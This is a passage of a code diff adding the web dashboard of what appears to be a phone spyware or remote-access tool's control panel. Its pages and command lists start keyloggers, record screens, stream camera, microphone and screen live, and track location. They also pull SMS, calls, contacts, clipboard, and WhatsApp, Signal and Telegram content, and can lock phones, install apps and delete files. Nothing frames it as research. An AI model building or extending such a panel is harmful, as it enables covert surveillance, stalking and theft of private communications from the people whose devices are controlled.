@@ -1,0 +1,1002 @@
+  3500→  <div class="cmd-grid" id="cmdGrid"></div>
+  3501→</div>
+  3502→<div class="card">
+  3503→  <h3>&#x1F4CB; Command Log</h3>
+  3504→  <div class="filter-bar">
+  3505→    <span class="filter-label">Filter:</span>
+  3506→    <select id="cmdStatusFilter" onchange="filterCommandLog()">
+  3507→      <option value="all">All Status</option>
+  3508→      <option value="pending">Pending</option>
+  3509→      <option value="completed">Completed</option>
+  3510→      <option value="failed">Failed</option>
+  3511→    </select>
+  3512→    <input type="text" id="cmdSearchInput" placeholder="Search commands..." oninput="filterCommandLog()" style="max-width:200px">
+  3513→  </div>
+  3514→  <div id="cmdLog" class="command-log"></div>
+  3515→</div>
+  3516→</div>
+  3517→
+  3518→<!-- ====== Files Page ====== -->
+  3519→<div class="page" id="page-files">
+  3520→<div class="topbar"><h1>&#x1F4C2; File Browser</h1></div>
+  3521→<div class="card"><h3>Select device to browse files</h3>
+  3522→<select id="fileDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
+  3523→<div class="cmd-grid" style="margin-top:12px">
+  3524→  <button class="cmd-btn" onclick="sendCmd('list_downloads')">&#x1F4E5; Downloads</button>
+  3525→  <button class="cmd-btn" onclick="sendCmd('list_dcim')">&#x1F4F8; DCIM</button>
+  3526→  <button class="cmd-btn" onclick="sendCmd('list_music')">&#x1F3B5; Music</button>
+  3527→  <button class="cmd-btn" onclick="sendCmd('list_videos')">&#x1F3AC; Videos</button>
+  3528→  <button class="cmd-btn" onclick="sendCmd('list_documents')">&#x1F4C1; Documents</button>
+  3529→  <button class="cmd-btn" onclick="sendCmd('list_whatsapp')">&#x1F4AC; WhatsApp</button>
+  3530→  <button class="cmd-btn" onclick="sendCmd('list_telegram_files')">&#x2708;&#xFE0F; Telegram</button>
+  3531→  <button class="cmd-btn" onclick="sendCmd('recent_files')">&#x1F550; Recent</button>
+  3532→</div></div>
+  3533→</div>
+  3534→
+  3535→<!-- ====== Data Page ====== -->
+  3536→<div class="page" id="page-data">
+  3537→<div class="topbar"><h1>&#x1F4E6; Data Viewer</h1></div>
+  3538→<div class="card"><h3>Quick Data</h3>
+  3539→<select id="dataDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+  3540→<div class="cmd-grid">
+  3541→  <button class="cmd-btn" onclick="sendDataCmd('sms')">&#x1F4F2; SMS</button>
+  3542→  <button class="cmd-btn" onclick="sendDataCmd('calls')">&#x1F4DE; Calls</button>
+  3543→  <button class="cmd-btn" onclick="sendDataCmd('contacts')">&#x1F4C7; Contacts</button>
+  3544→  <button class="cmd-btn" onclick="sendDataCmd('location')">&#x1F4CD; Location</button>
+  3545→  <button class="cmd-btn" onclick="sendDataCmd('notifications')">&#x1F514; Notifications</button>
+  3546→  <button class="cmd-btn" onclick="sendDataCmd('clipboard')">&#x1F4CB; Clipboard</button>
+  3547→  <button class="cmd-btn" onclick="sendDataCmd('battery')">&#x1F50B; Battery</button>
+  3548→  <button class="cmd-btn" onclick="sendDataCmd('info')">&#x2139;&#xFE0F; Device Info</button>
+  3549→</div></div>
+  3550→</div>
+  3551→
+  3552→<!-- ====== Monitor Page ====== -->
+  3553→<div class="page" id="page-monitor">
+  3554→<div class="topbar"><h1>&#x1F50D; Monitoring</h1></div>
+  3555→<div class="card"><h3>Monitor Controls</h3>
+  3556→<select id="monDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+  3557→<div class="cmd-grid">
+  3558→  <button class="cmd-btn" onclick="sendMonCmd('keylogger_start')">&#x2328;&#xFE0F; Start Keylogger</button>
+  3559→  <button class="cmd-btn" onclick="sendMonCmd('keylogger_stop')">&#x23F9; Stop Keylogger</button>
+  3560→  <button class="cmd-btn" onclick="sendMonCmd('get_keylogger')">&#x1F4E5; Get Keys</button>
+  3561→  <button class="cmd-btn" onclick="sendMonCmd('screen_record_start')">&#x1F534; Start Screen Record</button>
+  3562→  <button class="cmd-btn" onclick="sendMonCmd('screen_record_stop')">&#x23F9; Stop Screen Record</button>
+  3563→  <button class="cmd-btn" onclick="sendMonCmd('location_live')">&#x1F5FA;&#xFE0F; Live Location</button>
+  3564→  <button class="cmd-btn" onclick="sendMonCmd('location_stop')">&#x23F9; Stop Tracking</button>
+  3565→  <button class="cmd-btn" onclick="sendMonCmd('location_history')">&#x1F4DC; Location History</button>
+  3566→  <button class="cmd-btn" onclick="sendMonCmd('sms_monitor')">&#x1F4F2; SMS Monitor</button>
+  3567→  <button class="cmd-btn" onclick="sendMonCmd('call_monitor')">&#x1F4DE; Call Monitor</button>
+  3568→</div></div>
+  3569→</div>
+  3570→
+  3571→<!-- ====== Events Page ====== -->
+  3572→<div class="page" id="page-events">
+  3573→<div class="topbar">
+  3574→  <h1>&#x1F4CB; Event Log</h1>
+  3575→  <button class="btn btn-secondary btn-sm" onclick="loadEvents()">&#x1F504; Refresh</button>
+  3576→</div>
+  3577→<div class="filter-bar">
+  3578→  <span class="filter-label">Device:</span>
+  3579→  <select id="eventDeviceFilter" onchange="filterEventLog()"><option value="all">All Devices</option></select>
+  3580→  <span class="filter-label">Type:</span>
+  3581→  <select id="eventTypeFilter" onchange="filterEventLog()">
+  3582→    <option value="all">All Types</option>
+  3583→    <option value="security">Security</option>
+  3584→    <option value="info">Info</option>
+  3585→    <option value="warning">Warning</option>
+  3586→    <option value="success">Success</option>
+  3587→  </select>
+  3588→  <span class="filter-label">Date:</span>
+  3589→  <input type="date" id="eventDateFilter" onchange="filterEventLog()" style="max-width:160px">
+  3590→</div>
+  3591→<div class="auto-scroll-bar">
+  3592→  <label><input type="checkbox" id="eventAutoScroll" checked> Auto-scroll to latest</label>
+  3593→</div>
+  3594→<div class="table-wrap">
+  3595→  <table>
+  3596→    <thead><tr>
+  3597→      <th>Time</th><th>Device</th><th>Type</th><th>Event</th><th>Details</th>
+  3598→    </tr></thead>
+  3599→    <tbody id="eventLogBody"></tbody>
+  3600→  </table>
+  3601→</div>
+  3602→<div id="eventLogEmpty" class="empty" style="display:none">
+  3603→  <div class="empty-icon">&#x1F4ED;</div>No events found
+  3604→</div>
+  3605→</div>
+  3606→
+  3607→<!-- ====== Streaming Page ====== -->
+  3608→<div class="page" id="page-streaming">
+  3609→<div class="topbar"><h1>&#x1F4E1; Live Stream</h1></div>
+  3610→<div class="stream-layout">
+  3611→<div class="stream-controls">
+  3612→  <div class="card" style="margin-bottom:0">
+  3613→    <h3>Device</h3>
+  3614→    <select id="streamDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:0" onchange="onStreamDeviceChange()"></select>
+  3615→  </div>
+  3616→  <div class="card" style="margin-bottom:0">
+  3617→    <h3>Stream Type</h3>
+  3618→    <div class="stream-type-grid">
+  3619→      <button class="stream-type-btn active" id="stScreen" onclick="selectStreamType('screen')">
+  3620→        <span class="st-icon">&#x1F5A5;&#xFE0F;</span>Screen
+  3621→      </button>
+  3622→      <button class="stream-type-btn" id="stCamera" onclick="selectStreamType('camera')">
+  3623→        <span class="st-icon">&#x1F4F7;</span>Camera
+  3624→      </button>
+  3625→      <button class="stream-type-btn" id="stAudio" onclick="selectStreamType('audio')">
+  3626→        <span class="st-icon">&#x1F399;&#xFE0F;</span>Audio
+  3627→      </button>
+  3628→    </div>
+  3629→  </div>
+  3630→  <div class="card" style="margin-bottom:0">
+  3631→    <h3>Controls</h3>
+  3632→    <div class="stream-actions">
+  3633→      <button class="btn btn-primary" id="btnStartStream" onclick="startStream()">&#x25B6; Start Stream</button>
+  3634→      <button class="btn btn-danger" id="btnStopStream" onclick="stopStream()" style="display:none">&#x23F9; Stop Stream</button>
+  3635→      <button class="btn btn-secondary" id="btnSwitchCam" onclick="switchCamera()" style="display:none">&#x1F504; Switch Camera</button>
+  3636→    </div>
+  3637→  </div>
+  3638→  <div class="card" style="margin-bottom:0" id="qualityCard">
+  3639→    <h3>Quality</h3>
+  3640→    <div class="stream-quality">
+  3641→      <button class="active" onclick="setQuality('low',this)">SD</button>
+  3642→      <button onclick="setQuality('medium',this)">HD</button>
+  3643→      <button onclick="setQuality('high',this)">FHD</button>
+  3644→    </div>
+  3645→  </div>
+  3646→  <div class="card" style="margin-bottom:0">
+  3647→    <h3>Stream Info</h3>
+  3648→    <div class="stream-info" id="streamInfoPanel">
+  3649→      <div><span>Status</span><span id="stStatus">Stopped</span></div>
+  3650→      <div><span>Type</span><span id="stType">-</span></div>
+  3651→      <div><span>Device</span><span id="stDevice">-</span></div>
+  3652→      <div><span>Frames</span><span id="stFrames">0</span></div>
+  3653→      <div><span>Last Activity</span><span id="stLastAct">-</span></div>
+  3654→    </div>
+  3655→  </div>
+  3656→</div>
+  3657→<div>
+  3658→  <div class="stream-viewer" id="streamViewer">
+  3659→    <div class="no-stream" id="noStreamMsg">
+  3660→      <div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>
+  3661→      Select a device and start streaming
+  3662→    </div>
+  3663→    <img id="streamImg" style="display:none" alt="stream">
+  3664→    <div class="stream-badge" id="streamBadge" style="display:none">LIVE</div>
+  3665→  </div>
+  3666→  <div id="audioPlayerContainer" style="display:none;margin-top:12px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
+  3667→    <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
+  3668→      <span style="font-size:20px">&#x1F399;&#xFE0F;</span>
+  3669→      <span style="font-weight:600">Live Audio Stream</span>
+  3670→      <span class="badge badge-green" id="audioLiveBadge">LIVE</span>
+  3671→    </div>
+  3672→    <div class="audio-bars" id="audioBars"></div>
+  3673→    <audio id="streamAudio" autoplay style="width:100%;margin-top:8px"></audio>
+  3674→  </div>
+  3675→</div>
+  3676→</div>
+  3677→</div>
+  3678→
+  3679→<!-- ====== Settings Page ====== -->
+  3680→<div class="page" id="page-settings">
+  3681→<div class="topbar"><h1>&#x2699;&#xFE0F; Settings</h1></div>
+  3682→<div class="card"><h3>Server Settings</h3>
+  3683→<div id="settingsForm"></div>
+  3684→<button class="btn btn-primary" onclick="saveSettings()" style="margin-top:12px">&#x1F4BE; Save</button></div>
+  3685→</div>
+  3686→
+  3687→</div></div>
+  3688→
+  3689→<div class="notification" id="notif"></div>
+  3690→
+  3691→<script>
+  3692→/* ========== Utilities ========== */
+  3693→function esc(s){
+  3694→  if(s==null)return '';
+  3695→  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+  3696→}
+  3697→function relativeTime(dateStr){
+  3698→  if(!dateStr)return '';
+  3699→  try{
+  3700→    var d=new Date(dateStr);
+  3701→    if(isNaN(d.getTime()))return dateStr;
+  3702→    var now=Date.now();
+  3703→    var diff=Math.floor((now-d.getTime())/1000);
+  3704→    if(diff<0)diff=0;
+  3705→    if(diff<10)return 'just now';
+  3706→    if(diff<60)return diff+'s ago';
+  3707→    if(diff<3600)return Math.floor(diff/60)+'m ago';
+  3708→    if(diff<86400)return Math.floor(diff/3600)+'h ago';
+  3709→    if(diff<604800)return Math.floor(diff/86400)+'d ago';
+  3710→    return d.toLocaleDateString();
+  3711→  }catch(e){return dateStr;}
+  3712→}
+  3713→
+  3714→/* ========== State ========== */
+  3715→var TOKEN=localStorage.getItem('az_token')||'';
+  3716→var POLL_INTERVAL=null;
+  3717→var DEVICES=[];
+  3718→var ALL_COMMANDS=[];
+  3719→var ALL_EVENTS=[];
+  3720→var PENDING_REFRESH=null;
+  3721→
+  3722→/* ========== Notification ========== */
+  3723→function notify(msg,color){
+  3724→  color=color||'var(--green)';
+  3725→  var n=document.getElementById('notif');
+  3726→  n.innerHTML='<span style="color:'+color+';font-size:16px">&#x2713;</span> '+esc(msg);
+  3727→  n.style.borderColor=color;
+  3728→  n.classList.add('show');
+  3729→  clearTimeout(n._t);
+  3730→  n._t=setTimeout(function(){n.classList.remove('show');},3000);
+  3731→}
+  3732→
+  3733→/* ========== API ========== */
+  3734→function api(path,opts){
+  3735→  opts=opts||{};
+  3736→  return fetch('/api/'+path,{
+  3737→    headers:{'Content-Type':'application/json',...(TOKEN?{'Authorization':'Bearer '+TOKEN}:{})},
+  3738→    ...opts
+  3739→  }).then(function(r){return r.json();});
+  3740→}
+  3741→
+  3742→/* ========== Auth ========== */
+  3743→async function doLogin(){
+  3744→  var u=document.getElementById('loginUser').value;
+  3745→  var p=document.getElementById('loginPass').value;
+  3746→  var r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
+  3747→  if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
+  3748→  else{document.getElementById('loginError').style.display='block';}
+  3749→}
+  3750→function doLogout(){
+  3751→  try{api('web/logout',{method:'POST'});}catch(e){}
+  3752→  TOKEN='';localStorage.removeItem('az_token');
+  3753→  document.getElementById('app').style.display='none';
+  3754→  document.getElementById('loginPage').style.display='flex';
+  3755→  if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
+  3756→  if(ws&&ws.readyState<2)ws.close();
+  3757→}
+  3758→function showApp(){
+  3759→  document.getElementById('loginPage').style.display='none';
+  3760→  document.getElementById('app').style.display='block';
+  3761→  loadAll();
+  3762→  connectWS();
+  3763→  POLL_INTERVAL=setInterval(loadAll,8000);
+  3764→}
+  3765→
+  3766→/* ========== Sidebar ========== */
+  3767→function toggleSidebar(){
+  3768→  document.getElementById('sidebar').classList.toggle('open');
+  3769→  document.getElementById('sidebarOverlay').classList.toggle('open');
+  3770→}
+  3771→function showPage(name,el){
+  3772→  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
+  3773→  document.getElementById('page-'+name).classList.add('active');
+  3774→  document.querySelectorAll('.sidebar a[data-page]').forEach(function(a){a.classList.remove('active');});
+  3775→  if(el)el.classList.add('active');
+  3776→  else{
+  3777→    var link=document.querySelector('.sidebar a[data-page="'+name+'"]');
+  3778→    if(link)link.classList.add('active');
+  3779→  }
+  3780→  document.getElementById('sidebar').classList.remove('open');
+  3781→  document.getElementById('sidebarOverlay').classList.remove('open');
+  3782→}
+  3783→
+  3784→/* ========== Clock ========== */
+  3785→function updateClock(){
+  3786→  var now=new Date();
+  3787→  document.getElementById('clock').textContent=now.toLocaleString('ar-SA');
+  3788→}
+  3789→setInterval(updateClock,1000);updateClock();
+  3790→
+  3791→/* ========== WebSocket ========== */
+  3792→var ws=null;
+  3793→var wsReconnectDelay=1000;
+  3794→var wsMaxDelay=30000;
+  3795→function connectWS(){
+  3796→  if(!TOKEN)return;
+  3797→  try{
+  3798→    var proto=location.protocol==='https:'?'wss:':'ws:';
+  3799→    ws=new WebSocket(proto+'//'+location.host+'/ws/dashboard?token='+encodeURIComponent(TOKEN));
+  3800→    ws.onopen=function(){
+  3801→      wsReconnectDelay=1000;
+  3802→      setWSStatus('connected');
+  3803→    };
+  3804→    ws.onmessage=function(ev){
+  3805→      try{
+  3806→        var msg=JSON.parse(ev.data);
+  3807→        handleWSMessage(msg);
+  3808→      }catch(e){}
+  3809→    };
+  3810→    ws.onclose=function(){
+  3811→      setWSStatus('disconnected');
+  3812→      wsReconnectDelay=Math.min(wsReconnectDelay*1.5,wsMaxDelay);
+  3813→      setTimeout(connectWS,wsReconnectDelay);
+  3814→    };
+  3815→    ws.onerror=function(){
+  3816→      ws.close();
+  3817→    };
+  3818→  }catch(e){
+  3819→    setTimeout(connectWS,wsReconnectDelay);
+  3820→  }
+  3821→}
+  3822→function setWSStatus(status){
+  3823→  var ind=document.getElementById('wsIndicator');
+  3824→  var txt=document.getElementById('wsStatusText');
+  3825→  ind.className='live-indicator';
+  3826→  if(status==='connected'){ind.classList.remove('offline','connecting');txt.textContent='Live';}
+  3827→  else if(status==='disconnected'){ind.classList.add('offline');txt.textContent='Offline';}
+  3828→  else{ind.classList.add('connecting');txt.textContent='Connecting';}
+  3829→}
+  3830→function handleWSMessage(msg){
+  3831→  if(msg.type==='device_update'){
+  3832→    var dev=msg.device;
+  3833→    var idx=DEVICES.findIndex(function(d){return d.id===dev.id;});
+  3834→    if(idx>=0){DEVICES[idx]=dev;}
+  3835→    else{DEVICES.push(dev);}
+  3836→    populateDeviceSelects();
+  3837→    renderDevices();
+  3838→    updateDashDevices();
+  3839→  }
+  3840→  else if(msg.type==='device_online'){notify(msg.device_name+' came online','var(--green)');loadAll();}
+  3841→  else if(msg.type==='device_offline'){notify(msg.device_name+' went offline','var(--red)');loadAll();}
+  3842→  else if(msg.type==='command_update'){
+  3843→    var ci=ALL_COMMANDS.findIndex(function(c){return c.id===msg.command.id;});
+  3844→    if(ci>=0)ALL_COMMANDS[ci]=msg.command;
+  3845→    else ALL_COMMANDS.push(msg.command);
+  3846→    renderCommandLog(ALL_COMMANDS);
+  3847→    checkPendingRefresh();
+  3848→  }
+  3849→  else if(msg.type==='new_event'){
+  3850→    ALL_EVENTS.push(msg.event);
+  3851→    if(ALL_EVENTS.length>500)ALL_EVENTS=ALL_EVENTS.slice(-500);
+  3852→    renderEventLog(ALL_EVENTS);
+  3853→    populateEventDeviceFilter();
+  3854→  }
+  3855→  else if(msg.type==='stats_update'){
+  3856→    renderStats(msg.stats);
+  3857→  }
+  3858→}
+  3859→
+  3860→/* ========== Populate Selects ========== */
+  3861→function populateDeviceSelects(){
+  3862→  var html=DEVICES.map(function(d){return '<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+' ('+(d.active?'Online':'Offline')+')</option>';}).join('');
+  3863→  ['cmdDevice','fileDevice','dataDevice','monDevice','streamDevice'].forEach(function(id){
+  3864→    var el=document.getElementById(id);if(el)el.innerHTML=html;
+  3865→  });
+  3866→  populateEventDeviceFilter();
+  3867→}
+  3868→function populateEventDeviceFilter(){
+  3869→  var sel=document.getElementById('eventDeviceFilter');
+  3870→  if(!sel)return;
+  3871→  var cur=sel.value;
+  3872→  var html='<option value="all">All Devices</option>';
+  3873→  DEVICES.forEach(function(d){html+='<option value="'+esc(d.id)+'">'+esc(d.name||d.id)+'</option>';});
+  3874→  sel.innerHTML=html;
+  3875→  sel.value=cur;
+  3876→}
+  3877→
+  3878→/* ========== Load All ========== */
+  3879→async function loadAll(){
+  3880→  try{var r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
+  3881→  try{var r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();updateDashDevices();}}catch(e){}
+  3882→  try{var r=await api('web/commands');if(r.ok){ALL_COMMANDS=r.commands||[];renderCommandLog(ALL_COMMANDS);checkPendingRefresh();}}catch(e){}
+  3883→  loadEvents();
+  3884→  loadSettings();
+  3885→}
+  3886→
+  3887→/* ========== Stats Cards ========== */
+  3888→function renderStats(s){
+  3889→  var eventsToday=0;
+  3890→  var now=new Date();var todayStr=now.toISOString().slice(0,10);
+  3891→  ALL_EVENTS.forEach(function(ev){if((ev.time||'').slice(0,10)===todayStr)eventsToday++;});
+  3892→  var grid=document.getElementById('statsGrid');
+  3893→  grid.innerHTML=
+  3894→  '<div class="stat-card"><div class="stat-icon blue">&#x1F4F1;</div><div class="label">Total Devices</div><div class="value" style="color:var(--blue)">'+esc(s.devices_total)+'</div><div class="sub">&#x1F7E2; '+esc(s.devices_online)+' online</div></div>'+
+  3895→  '<div class="stat-card"><div class="stat-icon green">&#x26A1;</div><div class="label">Online Devices</div><div class="value" style="color:var(--green)">'+esc(s.devices_online)+'</div><div class="sub">of '+esc(s.devices_total)+' total</div></div>'+
+  3896→  '<div class="stat-card"><div class="stat-icon yellow">&#x23F3;</div><div class="label">Pending Commands</div><div class="value" style="color:var(--yellow)">'+esc(s.commands_pending)+'</div><div class="sub">'+esc(s.total_registered_commands)+' registered</div></div>'+
+  3897→  '<div class="stat-card"><div class="stat-icon purple">&#x1F4CB;</div><div class="label">Events Today</div><div class="value" style="color:var(--purple)">'+eventsToday+'</div><div class="sub">'+esc(s.events_total)+' total events</div></div>'+
+  3898→  '<div class="stat-card"><div class="stat-icon orange">&#x2709;&#xFE0F;</div><div class="label">Messages Sent</div><div class="value" style="color:var(--orange)">'+esc(s.messages_sent)+'</div></div>'+
+  3899→  '<div class="stat-card"><div class="stat-icon green">&#x2705;</div><div class="label">Commands Done</div><div class="value" style="color:var(--green)">'+esc(s.commands_completed)+'</div><div class="sub">&#x1F4E1; '+esc(s.api_hits)+' API hits</div></div>'+
+  3900→  '<div class="stat-card"><div class="stat-icon blue">&#x23F1;</div><div class="label">Uptime</div><div class="value" style="font-size:18px;color:var(--blue)">'+esc(s.uptime_formatted||'-')+'</div></div>';
+  3901→}
+  3902→
+  3903→/* ========== Device Cards ========== */
+  3904→function batteryClass(pct){
+  3905→  pct=parseInt(pct)||0;
+  3906→  if(pct>50)return 'high';
+  3907→  if(pct>20)return 'mid';
+  3908→  return 'low';
+  3909→}
+  3910→function batteryColor(pct){
+  3911→  pct=parseInt(pct)||0;
+  3912→  if(pct>50)return 'var(--green)';
+  3913→  if(pct>20)return 'var(--yellow)';
+  3914→  return 'var(--red)';
+  3915→}
+  3916→function signalBarsHtml(strength){
+  3917→  var s=parseInt(strength)||0;
+  3918→  var bars=4;
+  3919→  if(s<25)bars=1;else if(s<50)bars=2;else if(s<75)bars=3;
+  3920→  var html='<div class="signal-bars">';
+  3921→  for(var i=1;i<=4;i++)html+='<div class="bar'+(i<=bars?' active':'')+'"></div>';
+  3922→  html+='</div>';
+  3923→  return html;
+  3924→}
+  3925→function deviceCardHtml(d){
+  3926→  var isOn=!!d.active;
+  3927→  var batt=parseInt(d.battery)||null;
+  3928→  var battHtml=batt!==null?'<div class="battery-bar"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div><span class="battery-text" style="color:'+batteryColor(batt)+'">'+batt+'%</span></div>':'';
+  3929→  var sigHtml=d.signal?signalBarsHtml(d.signal):'';
+  3930→  return '<div class="device-card" onclick="showDeviceDetail(\''+esc(d.id)+'\')">'+
+  3931→    '<div class="dc-header">'+
+  3932→      '<div class="dc-status '+(isOn?'online':'offline')+'"></div>'+
+  3933→      '<div class="dc-name">'+esc(d.name||d.id)+'</div>'+
+  3934→    '</div>'+
+  3935→    '<div class="dc-model">'+esc(d.model||'Unknown Model')+(d.os?' | '+esc(d.os):'')+'</div>'+
+  3936→    '<div class="dc-meta">'+
+  3937→      (battHtml?'<div class="meta-item"><span class="meta-icon">&#x1F50B;</span>'+battHtml+'</div>':'')+
+  3938→      (sigHtml?'<div class="meta-item"><span class="meta-icon">&#x1F4F6;</span>'+sigHtml+'</div>':'')+
+  3939→      '<div class="meta-item"><span class="meta-icon">&#x1F552;</span><span class="relative-time">'+relativeTime(d.last_seen)+'</span></div>'+
+  3940→      (d.network?'<div class="meta-item"><span class="meta-icon">&#x1F310;</span>'+esc(d.network)+'</div>':'')+
+  3941→    '</div>'+
+  3942→  '</div>';
+  3943→}
+  3944→function renderDevices(){
+  3945→  var filtered=filterDevicesList(DEVICES);
+  3946→  var el=document.getElementById('deviceList');
+  3947→  if(!filtered.length){el.innerHTML='<div class="empty"><div class="empty-icon">&#x1F4F1;</div>No devices found</div>';return;}
+  3948→  el.innerHTML=filtered.map(deviceCardHtml).join('');
+  3949→}
+  3950→function updateDashDevices(){
+  3951→  var dash=document.getElementById('dashDevices');
+  3952→  if(!DEVICES.length){dash.innerHTML='<div class="empty">No devices</div>';return;}
+  3953→  dash.innerHTML=DEVICES.filter(function(d){return d.active;}).slice(0,6).map(deviceCardHtml).join('');
+  3954→}
+  3955→function filterDevices(){
+  3956→  renderDevices();
+  3957→}
+  3958→function filterDevicesList(devices){
+  3959→  var q=(document.getElementById('deviceSearch').value||'').toLowerCase();
+  3960→  var statusF=document.getElementById('deviceStatusFilter').value;
+  3961→  return devices.filter(function(d){
+  3962→    if(statusF==='online'&&!d.active)return false;
+  3963→    if(statusF==='offline'&&d.active)return false;
+  3964→    if(q){
+  3965→      var text=(d.name||' '+d.id+' '+d.model+' '+d.os).toLowerCase();
+  3966→      if(text.indexOf(q)<0)return false;
+  3967→    }
+  3968→    return true;
+  3969→  });
+  3970→}
+  3971→
+  3972→/* ========== Device Detail ========== */
+  3973→async function showDeviceDetail(id){
+  3974→  try{
+  3975→    var r=await api('web/device/'+id);
+  3976→    if(!r.ok)return;
+  3977→    var d=r.device;var cmds=r.commands||[];
+  3978→    var detail=document.getElementById('deviceDetail');
+  3979→    detail.style.display='block';
+  3980→    var batt=parseInt(d.battery)||null;
+  3981→    var battHtml=batt!==null?'<span style="color:'+batteryColor(batt)+';font-weight:600">'+batt+'%</span> '+
+  3982→      '<div class="battery-bar" style="display:inline-flex;vertical-align:middle;margin-right:8px"><div class="battery-shell"><div class="battery-fill '+batteryClass(batt)+'" style="width:'+Math.max(0,Math.min(100,batt))+'%"></div></div></div>':'-';
+  3983→    detail.innerHTML=
+  3984→      '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">'+
+  3985→        '<div class="dc-status '+(d.active?'online':'offline')+'" style="width:14px;height:14px"></div>'+
+  3986→        '<h2 style="font-size:20px">'+esc(d.name||d.id)+'</h2>'+
+  3987→        (d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>')+
+  3988→      '</div>'+
+  3989→      '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px">'+
+  3990→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">DEVICE ID</div><code style="font-size:12px">'+esc(d.id)+'</code></div>'+
+  3991→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">MODEL</div><div>'+esc(d.model||'-')+'</div></div>'+
+  3992→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">OS</div><div>'+esc(d.os||'-')+'</div></div>'+
+  3993→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">BATTERY</div><div>'+battHtml+'</div></div>'+
+  3994→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">NETWORK</div><div>'+esc(d.network||'-')+'</div></div>'+
+  3995→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LOCATION</div><div>'+esc(d.location||'-')+'</div></div>'+
+  3996→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">LAST SEEN</div><div>'+esc(d.last_seen||'-')+' <span class="relative-time">('+relativeTime(d.last_seen)+')</span></div></div>'+
+  3997→        '<div class="card" style="margin:0;padding:14px"><div style="color:var(--text-muted);font-size:11px;margin-bottom:2px">CREATED</div><div>'+esc(d.created_at||'-')+'</div></div>'+
+  3998→      '</div>'+
+  3999→      '<h3 style="margin-bottom:12px">&#x1F4CB; Recent Commands</h3>'+
+  4000→      (cmds.length?cmds.map(function(c){return cmdItemHtml(c);}).join(''):'<div class="empty">No commands</div>')+
+  4001→      '<button class="btn btn-danger btn-sm" onclick="unlinkDevice(\''+esc(d.id)+'\')" style="margin-top:16px">&#x1F5D1;&#xFE0F; Unlink Device</button>';
+  4002→    detail.scrollIntoView({behavior:'smooth'});
+  4003→  }catch(e){}
+  4004→}
+  4005→
+  4006→/* ========== Unlink / Link ========== */
+  4007→async function unlinkDevice(id){
+  4008→  if(!confirm('Unlink this device?'))return;
+  4009→  var r=await api('web/unlink/'+id,{method:'DELETE'});
+  4010→  if(r.ok){notify('Device unlinked');loadAll();}
+  4011→  else notify('Failed','var(--red)');
+  4012→}
+  4013→async function generateLink(){
+  4014→  var r=await api('web/link_code');
+  4015→  if(r.ok){
+  4016→    var box=document.getElementById('linkCodeBox');
+  4017→    document.getElementById('linkCodeText').textContent=r.code;
+  4018→    box.style.display='block';
+  4019→    notify('Link code generated!');
+  4020→  }
+  4021→}
+  4022→
+  4023→/* ========== Command Categories ========== */
+  4024→var CMD_CATEGORIES={
+  4025→  data:{label:'&#x1F4CA; Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
+  4026→  social:{label:'&#x1F310; Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
+  4027→  control:{label:'&#x1F3AE; Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
+  4028→  apps:{label:'&#x1F4E6; Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
+  4029→  files:{label:'&#x1F4C2; Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
